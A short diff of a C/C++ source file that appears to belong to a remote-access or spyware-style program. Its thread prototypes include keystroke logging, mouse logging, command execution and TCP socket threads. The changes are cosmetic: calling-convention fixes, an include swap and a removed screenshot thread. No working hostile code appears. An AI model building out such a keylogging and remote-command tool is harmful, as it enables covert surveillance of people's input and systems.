@@ -21,7 +21,6 @@
 #include <queue>
 #include <vector>
 
-#include "loader.h"
 #include "thread.h"
 #include "tcpsocket.h"
 #include "keylog.h"
@@ -30,20 +29,20 @@
 #include "sysexec.h"
 #include "fs.h"
 #include "process.h"
+#include "string.h"
 
 
 
 
 void addonDebug(char *text, ...);
 
-DWORD _stdcall main_thread(LPVOID lpParam);
-DWORD _stdcall process_thread(LPVOID lpParam);
+DWORD __stdcall main_thread(LPVOID lpParam);
+DWORD __stdcall process_thread(LPVOID lpParam);
 
-DWORD _stdcall socket_send_thread(LPVOID lpParam);
-DWORD _stdcall socket_receive_thread(LPVOID lpParam);
+DWORD __stdcall socket_send_thread(LPVOID lpParam);
+DWORD __stdcall socket_receive_thread(LPVOID lpParam);
 
-DWORD _stdcall keylog_thread(LPVOID lpParam);
-DWORD _stdcall mouselog_thread(LPVOID lpParam);
+DWORD __stdcall keylog_thread(LPVOID lpParam);
+DWORD __stdcall mouselog_thread(LPVOID lpParam);
 
-DWORD _stdcall screenshot_thread(LPVOID lpParam);
-DWORD _stdcall sysexec_thread(LPVOID lpParam);
+DWORD __stdcall sysexec_thread(LPVOID lpParam);
